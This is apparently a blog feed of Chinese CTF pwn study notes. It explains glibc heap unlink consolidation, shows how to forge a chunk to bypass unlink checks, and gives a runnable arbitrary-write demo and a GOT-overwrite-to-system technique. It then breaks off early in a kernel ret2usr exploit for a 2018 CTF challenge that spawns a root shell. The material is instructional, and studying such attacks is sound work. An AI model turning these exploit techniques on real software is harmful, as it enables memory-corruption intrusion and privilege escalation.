        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="释放堆"><a href="#释放堆" class="headerlink" title="释放堆"></a>释放堆</h2><p>释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态 (PREV_INUSE（P）位 是否为 0), 若是则会进行堆合并。合并时会执行 unlink 操作, 将空闲堆块从所属的 bins 链中卸下进行合并, 并将合并后的 chunk 添加到 unsorted bin 中</p><p>堆合并分为<strong>向前合并</strong>和<strong>向后合并</strong></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li>当前 free 的 chunk 用 this_chunk 表示</li><li>当前 chunk 的前一个chunk 用 pre_chunk 表示, 大小用 pre_size 表示</li><li>当前 chunk 的后一个 chunk 用 next_chunk 表示, 大小用 next_size 表示</li></ul><h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>malloc.c 中向后合并的代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4276</span>            <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="number">4277</span>            <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"><span class="number">4278</span>              prevsize = prev_size (p);</span><br><span class="line"><span class="number">4279</span>              size += prevsize;</span><br><span class="line"><span class="number">4280</span>              p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line"><span class="number">4281</span>              unlink(av, p, bck, fwd);</span><br><span class="line"><span class="number">4282</span>            &#125;</span><br></pre></td></tr></table></figure><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol><li>检查指针 p 指向的 this_chunk 的 size 字段的 PREV_INUSE 位 是否为 0, 为 0 表示 pre_chunk 已经被 free, 则进入<strong>向后合并</strong>流程</li><li>获取 pre_chunk 的 size, 加到 size 中, 以此来表示 size 已经合并</li><li>根据 this_chunk 的 PREV_SIZE 位来获得 pre_chunk 的指针</li><li>将这个指针传入 unlink 宏, 即让 pre_chunk 进入 unlink 流程</li></ol><h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>malloc.c 中向前合并的代码如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4284</span>        <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line"><span class="number">4285</span>              <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line"><span class="number">4286</span>              nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"><span class="number">4287</span></span><br><span class="line"><span class="number">4288</span>              <span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="number">4289</span>              <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line"><span class="number">4290</span>                unlink(av, nextchunk, bck, fwd);</span><br><span class="line"><span class="number">4291</span>                size += nextsize;</span><br><span class="line"><span class="number">4292</span>              &#125; <span class="keyword">else</span></span><br><span class="line"><span class="number">4293</span>                clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line"><span class="number">4319</span>            &#125;</span><br><span class="line"><span class="number">4320</span>  </span><br></pre></td></tr></table></figure><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><ol><li><p>检查 next_chunk 的信息</p><ol><li><p>如果 next_chunk 不是 top chunk 且 next_chunk 的 next_chunk 的 PREV_INUSE 为 0, 则进入<strong>向前合并</strong>流程</p></li><li><p>如果 next_chunk 不是 free 的, 则修改他的 size 字段的 PRE_INUSE 位</p></li><li><p>如果 next_chunk 是 top chunk 则 this_chunk 与 top chunk 合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4321</span>            <span class="comment">/*</span></span><br><span class="line"><span class="comment">4322              If the chunk borders the current high end of memory,      4323              consolidate into top</span></span><br><span class="line"><span class="comment">4324            */</span></span><br><span class="line"><span class="number">4325</span></span><br><span class="line"><span class="number">4326</span>            <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">4327</span>              size += nextsize;</span><br><span class="line"><span class="number">4328</span>              set_head(p, size | PREV_INUSE);</span><br><span class="line"><span class="number">4329</span>              av-&gt;top = p;</span><br><span class="line"><span class="number">4330</span>              check_chunk(av, p);</span><br><span class="line"><span class="number">4331</span>            &#125;</span><br></pre></td></tr></table></figure></li><li><p>检测 next_chunk 是否 INUSE, 是通过inuse_bit_at_offset(nextchunk, nextsize) 来获得next_chunk 的 next_chunk 的size字段的presize位实现的。</p></li></ol></li><li><p>让 next_chunk 进入 unlink 流程</p></li><li><p>size += next_size , 表示大小上两个 chunk 已经合并</p></li></ol><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><blockquote><p>unlink是个宏, 但是在读代码的时候请把<strong>bk和fd</strong>当作变量。</p></blockquote><ul><li>p 是指向当前执行 unlink 操作的 chunk 的指针</li><li>以下为 glibc-2.19 中 unlink 宏的代码</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">              malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">            FD = P-&gt;fd;</span><br><span class="line">            BK = P-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">              malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                FD-&gt;bk = BK;</span><br><span class="line">                BK-&gt;fd = FD;</span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">                    &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">                        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">                      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                          FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                        P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                      &#125;                         &#125;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h3><ol><li><p>检查 P 的 size 字段 和 P 的 next_chunk 中记录的 PREV_SIZE 是否一致, 不一致则出现<strong>corrupted size vs. prev_size</strong>的错误</p></li><li><p>检查是否满足 P-&gt;fd-&gt;bk == P 和 P-&gt;bk-&gt;fd == P, 否则出现<strong>corrupted double-linked list</strong>错误</p><p>为了绕过这个检查, 需要以下条件</p><ul><li>程序中存在一个全局指针变量 ptr</li><li>ptr 指向的对内存可由用户控制</li></ul><p>若具备以上条件, 攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P, 根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk, 使得 <code>P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</code> 成立。具体如下(<strong>64 位</strong>):</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0x10</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><ul><li>实际上就是当 P-&gt;fd 或 P-&gt;bk 所存地址解释为 chunk 结构时其对应的 fd 或 bk 都为 P 的地址</li></ul><p>在执行 unlink（P）时的指针操作如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0x10</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x18</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0x10 + 0x10 = ptr; BK-&gt;fd = ptr -0x18 + 0x18 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P, 可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK, 即 *ptr = ptr - <span class="number">0x10</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD, 即 *ptr = ptr - <span class="number">0x18</span>。</span><br></pre></td></tr></table></figure><p>由以上过程可知, 借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制, 并通过 unlink 攻击实现写内存, 最终使得 ptr 指向 ptr - 0x18。</p><p><strong>unlink 后, 对 ptr 指向的内存进行写入, 如 <code>‘A’*0x18 + free@got</code>, 使得 ptr 指向 free@got, 再次对 ptr 指向的内存进行写入, 可以把 free@got 修改为 system 的地址, 之后调用 free 可任意命令执行。</strong></p></li><li><p>解链:FD-&gt;bk = bk 和 BK-&gt;fd = fd</p><p>以下是CTF-Wiki的图</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724111055883.png" alt="image-20200724111055883" style="zoom:50%;" /><ul><li>如果此时 P 的 Fd 和 BK 被我们修改为 FD 的地址</li></ul></li><li><p>接着对<strong>large chunk</strong>的一系列检测和处理机制</p></li></ol><ul><li>以上就是unlink的操作, 本质上就是从glibc管理的bin链中解链以及解链前的安全检查（防止被利用）</li></ul><h3 id="整理-chunk-结构并放入-unsorted-bin-中"><a href="#整理-chunk-结构并放入-unsorted-bin-中" class="headerlink" title="整理 chunk 结构并放入 unsorted bin 中"></a>整理 chunk 结构并放入 unsorted bin 中</h3><p>除了 next_chunk 为 top chunk 外, 都会执行下列代码, <strong>将合并好的chunk加入到unsorted bin中第一个</strong></p><p>如果 this_chunk 是 samll chunk 大小的话, 没有fd_nextsize和bk_nextsize的</p><p>然后设置合并后的 chunk 的头部（设置合并后的 size, 已经合并的this_chunk 的 next_chunk 的 PREV_SIZE 字段）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4295</span>              <span class="comment">/*</span></span><br><span class="line"><span class="comment">4296                Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">4297                not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">4298                been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">4299              */</span></span><br><span class="line"><span class="number">4300</span></span><br><span class="line"><span class="number">4301</span>              bck = unsorted_chunks(av);</span><br><span class="line"><span class="number">4302</span>              fwd = bck-&gt;fd;</span><br><span class="line"><span class="number">4303</span>              <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line"><span class="number">4304</span>                malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line"><span class="number">4305</span>              p-&gt;fd = fwd;</span><br><span class="line"><span class="number">4306</span>              p-&gt;bk = bck;</span><br><span class="line"><span class="number">4307</span>              <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line"><span class="number">4308</span>                &#123;</span><br><span class="line"><span class="number">4309</span>                  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">4310</span>                  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">4311</span>                &#125;</span><br><span class="line"><span class="number">4312</span>              bck-&gt;fd = p;</span><br><span class="line"><span class="number">4313</span>              fwd-&gt;bk = p;</span><br><span class="line"><span class="number">4314</span></span><br><span class="line"><span class="number">4315</span>              set_head(p, size | PREV_INUSE);</span><br><span class="line"><span class="number">4316</span>              set_foot(p, size);</span><br><span class="line"><span class="number">4317</span></span><br><span class="line"><span class="number">4318</span>              check_free_chunk(av, p);</span><br></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><blockquote><p>libc version: 2.23</p></blockquote><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chunk_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk_struct</span> *<span class="title">fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk_struct</span> *<span class="title">bk</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];  <span class="comment">// padding</span></span><br><span class="line">&#125; chunk_struct;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> * chunk1, *chunk2;</span><br><span class="line">    chunk_struct *fake_chunk, *chunk2_hdr;</span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Fist malloc two chunks (non fast bin)</span></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// show addresses</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] chunk1 pointer address: %p\n&quot;</span>, &amp;chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] chunk1 address: %p\n&quot;</span>, chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] chunk2 address: %p\n&quot;</span>, chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assuming attacker has contorl over chunk1&#x27;s contents</span></span><br><span class="line">    <span class="comment">// Overflow the heap, override chunk2&#x27;s header</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// First forge a fake chun starting at chunk1&#x27;s</span></span><br><span class="line">    <span class="comment">// Need to setup fd and bk pointers to pass the unlink security check</span></span><br><span class="line">    fake_chunk = (chunk_struct *) chunk1;</span><br><span class="line">    fake_chunk-&gt;fd = (chunk_struct *)(&amp;chunk1 - <span class="number">3</span>);</span><br><span class="line">    fake_chunk-&gt;bk = (chunk_struct *)(&amp;chunk1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Next modify the header of chunk2 to pass all security checks</span></span><br><span class="line">    chunk2_hdr = (chunk_struct *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">    chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;       <span class="comment">// chunk1&#x27;s data region size</span></span><br><span class="line">    chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;             <span class="comment">// unsetting prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;</span></span><br><span class="line">    <span class="comment">// This results in chunk1 pointer pointeing to chunk1 - 3</span></span><br><span class="line">    <span class="comment">// i.e. chunk1[3] now ctains chunk1 itself</span></span><br><span class="line">    <span class="comment">// We the make chunk1 point to some victim&#x27;s data</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] free chunk2\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now chunk1 address: %p\n&quot;</span>, chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now chunk1&#x27;s fd: 0x%lx\n&quot;</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(data, <span class="string">&quot;victim&#x27;s data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Overwrite victim&#x27;s data using chunk1</span></span><br><span class="line">    chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now data: %s\n&quot;</span>, data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译与运行"><a href="#编译与运行" class="headerlink" title="编译与运行"></a>编译与运行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc unlink_demo.c -ggdb -z lazy -o unlink_demo -Wl, --rpath=./libc.so.6 \           -Wl, --dynamic-linker=./ld-2.23.so</span><br></pre></td></tr></table></figure><ul><li><code>-ggdb</code>: 保留程序调试信息, 包括符号表、预定义宏等</li><li><code>-Wl, --rpath=./libc.so.6</code>: 指定libc版本</li><li><code>-Wl, --dynamic-linker=./ld-2.23.so</code>: 指定ld版本</li><li>Ubuntu18.04 64</li></ul><p>运行结果:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724143930003.png" alt="image-20200724143930003"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li><p>开启 gdb 调试 , 用<code>--silent</code>去掉开头一堆免责信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb unlink_demo --silent</span><br></pre></td></tr></table></figure></li><li><p>由于有源文件, 因此我们可以直接对行号进行下断, 15行为 <code>int main()</code> 所在位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br></pre></td></tr></table></figure></li><li><p>我们用<code>ni</code>指令(表示单步步过)运行到第26行, 即 malloc 两块chunk后, 查看<code>heap</code>信息</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724154547693.png" alt="image-20200724154547693" style="zoom:50%;" /></li><li><p><strong>然后在chunk1中伪造一个 chunk , 使得 fake_chunk-&gt;fd-&gt;bk == fake_chunk 和 fake_chunk-&gt;bd-&gt;fd == fake_chunk 来避过 corrupted double-linked list 检测。</strong></p><p>因为要使得 fake_chunk-&gt;fd—&gt;bk == fake_chunk 的话, 要让fake_chunk-&gt;fd 里面存的含有 chunk1 的地址的变量往上偏移 0x18, 同理 fake_chunk-&gt;bk 也是要往上偏移 0x10 的, 即</p><ul><li>当把 fake_chunk-&gt;fd 里面的地址解释为 chunk 的时候, 这个 chunk 的 bk 位置为 fake_chunk 的地址。</li><li>当把 fake_chunk-&gt;bk 里面的地址解释为 chunk 的时候, 这个 chunk 的 fd 位置为 fake_chunk 的地址。</li><li>而这里存放 fake_chunk 地址的实际上是同一个地址</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fake_chunk = (chunk_struct *) chunk1;</span><br><span class="line">fake_chunk-&gt;fd = (chunk_struct *)(&amp;chunk1 - <span class="number">3</span>);</span><br><span class="line">fake_chunk-&gt;bk = (chunk_struct *)(&amp;chunk1 - <span class="number">2</span>);</span><br></pre></td></tr></table></figure><ul><li>这里的<code>-3</code>和<code>-2</code>分别对应指针类型, 即<code>- 3 * 8</code> 和 <code>-2 * 8</code></li></ul><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200726221609548.png" alt="image-20200726221609548" style="zoom:50%;" /></li><li><p>然后修改好 chunk2 的 PREV_SIZE 字段为 0x80 就是 chunk1 的数据大小（用来避过corrupted size vs. prev_size检测的, 和 size 字段的 PREV_INUSE 位为0, 从而达到欺骗glibc的机制, 让它认为chunk2的前一块chunk（也就是chunk1）是free的, 并且满足unlink所有的安全机制。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk2_hdr = (chunk_struct *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;</span><br><span class="line">chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724155503500.png" alt="image-20200724155503500" style="zoom:50%;" /></li><li><p>这时候 free 掉 chunk2 的话就会触发向后合并。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(chunk2)</span><br></pre></td></tr></table></figure><p>此时 unsorted bin 中</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724174030848.png" alt="image-20200724174030848" style="zoom:50%;" /><p>本来应该只有 chunk2 (0x555555559090) 在 bins 中但此时在 bins 中却是 chunk1 + 0x10, 即 fake_chunk</p><p>此时查看 fake_chunk 可以看到 fake_chunk 指向的 chunk1 已经被 free 掉了, size 为 chunk1_size + chunk2_size = 0x90 + 0x90 = 0x110, fd 和 bk 全部指向 0x7ffff7dd4b78 即 main_arena + 88 的地址, <strong>由于 main_arena 和 libc 的偏移固定, 如果此时可以将内容打印, 那么就可以通过 leak main_arena 的地址来计算 libc 的基址</strong></p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724185440472.png" alt="image-20200724185440472" style="zoom: 50%;" /></li><li><p>此时指向 chunk1 的指针内容为 chunk1 的地址, 而chunk1[3] 即 chunk1-&gt;fd 的位置的值为该指针的地址, 相当一个二级指针(<strong>unlink 的解链操作造成的</strong>)</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724195151867.png" alt="image-20200724195151867"></p><p>此时修改 chunk1[3] 的内容为 data 的地址, 即是修改指向 chunk1 的指针的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk[<span class="number">3</span>] = data</span><br><span class="line"><span class="built_in">strcpy</span>(data, <span class="string">&quot;victim&#x27;s data&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到此时指向 chunk1 的指针已经被修改为指向 data</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724195716409.png" alt="image-20200724195716409" style="zoom: 67%;" /></li><li><p>此时修改 chunk1[0] 其实就是在修改 data 的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200724200020970.png" alt="image-20200724200020970"></p><p>这便是使用 unlink 机制实现任意地址写操作</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以利用 unlink 机制来实现:</p><ol><li>leak main_arena 的地址从而计算 libc 的地址</li><li>泄露 heap address 的地址</li><li>实现任意地址写操作</li></ol><p>实现以上操作需要绕过 unlink 的安全检查机制, 即当我们 unlink this_chunk 时我们需要</p><ul><li><p>程序中存在一个全局指针变量 ptr</p></li><li><p>ptr 指向的对内存可由用户控制, 使其变为 this_chunk 的地址</p></li><li><p>然后使得 this_chunk 的 fd 和 bk 变为 <code>ptr - 0x10</code> 和 <code>ptr - 0x18</code></p></li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://lantern.cool/wp-item-ZCTF-2016-note2/">ZCTF-2016-note2</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.ichunqiu.com/thread-46614-1-1.html">Glibc堆块的向前向后合并与unlink原理机制探究</a></p><p><a href="http://0x4c43.cn/2017/1231/linux-heap-memory-overflow-unlink-attack/">Linux 堆内存溢出 unlink 攻击</a></p><p><a href="https://introspelliam.github.io/others/files/malloc.c">malloc.c 源码</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel ret2usr</title>
      <link href="/note-pwn-kernel-ret2usr/"/>
      <url>/note-pwn-kernel-ret2usr/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/ret2usr-zh/">CTFWiki-ret2usr</a> 根据学习情况略有修改</p><h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p>ret2usr 攻击利用了 <strong>用户空间的进程不能访问内核空间,但内核空间能访问用户空间</strong> 这个特性来定向内核代码或数据流指向用户控件,以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作。</p><h3 id="2018-强网杯-core"><a href="#2018-强网杯-core" class="headerlink" title="2018 强网杯 - core"></a>2018 强网杯 - core</h3><p>之前已分析使用<code>kernel rop</code>实现提权,而这篇分析一下使用 ret2usr 手法获取 root shell。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = 